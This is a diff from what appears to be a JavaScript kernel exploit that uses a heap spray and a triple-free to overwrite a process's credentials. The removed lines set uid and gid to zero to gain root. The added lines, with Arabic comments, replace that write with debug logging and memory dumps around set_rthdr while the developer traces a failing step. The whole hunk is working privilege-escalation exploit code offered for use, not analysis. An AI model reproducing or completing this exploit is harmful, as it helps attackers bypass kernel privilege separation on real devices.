@@ -1296,15 +1296,42 @@ function find_twins() {
   return ok;
 }
 function overwrite_ucred(sock) {
-  send_notification("[SELF] overwrite_ucred on sock=" + sock);
+  send_notification("[MONITOR] overwrite_ucred ENTER sock=" + sock);
 
-  // uid / gid = 0
-  write32(spray_rthdr.add(0x04), 0); // uid
-  write32(spray_rthdr.add(0x08), 0); // gid
+  // 1) تأكيد إن spray_rthdr pointer سليم
+  send_notification("[MONITOR] spray_rthdr = " + spray_rthdr);
+  send_notification("[MONITOR] spray_rthdr_len = " + spray_rthdr_len);
 
-  // لو محتاج euid/egid أو غيره، زوّدهم هنا بنفس الفكرة
+  // 2) Dump أول 0x20 بايت من الذاكرة قبل أي كتابة
+  var dump_before = "";
+  for (var i = 0; i < 0x20; i += 4) {
+    dump_before += read32(spray_rthdr.add(i)).toString(16) + " ";
+  }
+  send_notification("[MONITOR] dump_before = " + dump_before);
 
-  set_rthdr(sock, spray_rthdr, spray_rthdr_len);
+  // 3) مراقبة أماكن الكتابة (من غير كتابة فعلية)
+  send_notification("[MONITOR] planned write uid @ " + spray_rthdr.add(0x04));
+  send_notification("[MONITOR] planned write gid @ " + spray_rthdr.add(0x08));
+
+  // 4) قبل set_rthdr
+  send_notification("[MONITOR] before set_rthdr(sock=" + sock + ")");
+
+  // 5) استدعاء set_rthdr (ممكن يكون هو اللي بيكسر الفلو)
+  try {
+    set_rthdr(sock, spray_rthdr, spray_rthdr_len);
+    send_notification("[MONITOR] after set_rthdr (SUCCESS)");
+  } catch (e) {
+    send_notification("[MONITOR] set_rthdr ERROR: " + e);
+  }
+
+  // 6) Dump بعد set_rthdr
+  var dump_after = "";
+  for (var i = 0; i < 0x20; i += 4) {
+    dump_after += read32(spray_rthdr.add(i)).toString(16) + " ";
+  }
+  send_notification("[MONITOR] dump_after = " + dump_after);
+
+  send_notification("[MONITOR] overwrite_ucred EXIT");
 }
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 1000;
 
